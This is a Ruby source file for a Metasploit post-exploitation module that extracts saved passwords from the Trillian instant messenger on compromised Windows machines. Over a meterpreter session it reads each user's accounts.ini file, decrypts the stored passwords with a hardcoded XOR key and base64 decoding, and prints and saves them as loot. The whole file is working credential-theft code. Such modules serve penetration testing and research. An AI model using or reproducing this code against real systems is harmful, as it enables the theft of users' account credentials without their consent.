##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/parser/ini'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Windows Gather Trillian Password Extractor',
      'Description' => %q{
        This module extracts account password from Trillian & Trillian Astra
        v4.x-5.x instant messenger.
      },
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',
          'Unknown', # SecurityXploded Team, www.SecurityXploded.com
        ],
      'Platform' => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ]
    ))
  end

  def run
    grab_user_profiles().each do |user|
      accounts = user['AppData'] + "\\Trillian\\users\\global\\accounts.ini"
      next if user['AppData'] == nil
      next if accounts.empty?
      stat = session.fs.file.stat(accounts) rescue nil
      next if stat.nil?
      get_ini(accounts)
    end
  end

  def get_ini(file)
    begin
      config = client.fs.file.new(file,'r')
      parse = config.read
      ini = Rex::Parser::Ini.from_s(parse)

      if ini == {}
        print_error("Unable to parse file")
        return
      end

      creds = Rex::Text::Table.new(
        'Header'  => 'Trillian versions 4-5 Instant Messenger Credentials',
        'Indent'	=> 1,
        'Columns' =>
        [
          'User',
          'Password'
        ]
      )

      ini.each_key do |group|
        username = ini[group]['Account']
        epass = ini[group]['Password']
        next if epass == nil or epass == ""
        passwd = decrypt(epass).chop
        print_good("User: #{username}  Password: #{passwd}")
        creds << [username, passwd]
      end

      print_status("Storing data...")
      path = store_loot(
        'trillian.user.creds',
        'text/csv',
        session,
        creds.to_csv,
        'trillian_user_creds.csv',
        'Trillian Instant Messenger User Credentials'
        )
      print_good("Trillian Instant Messenger user credentials saved in: #{path}")

    rescue ::Exception => e
      print_error("An error has occurred: #{e.to_s}")
    end
  end

  def decrypt (epass)
    magicarr = [243, 38, 129, 196, 57, 134, 219, 146, 113, 163, 185, 230, 83,
    122, 149, 124, 0, 0, 0, 0, 0, 0, 255, 0, 0, 128, 0, 0, 0, 128, 128, 0,
    255, 0, 0, 0, 128, 0, 128, 0, 128, 128, 0, 0, 0, 128, 255, 0, 128, 0,
    255, 0, 128, 128, 128, 0, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32,
    114, 101, 115, 111, 108, 118, 101, 32, 72, 84, 84, 80, 32, 112, 114, 111,
    120, 0]

    decpass = Rex::Text.decode_base64(epass)
    plaintext = [decpass].pack("H*").unpack("C*")

    for i in 0 .. plaintext.length-2 do
      plaintext[i] ^= magicarr[i]
    end

    return plaintext.pack("C*")
  end
end
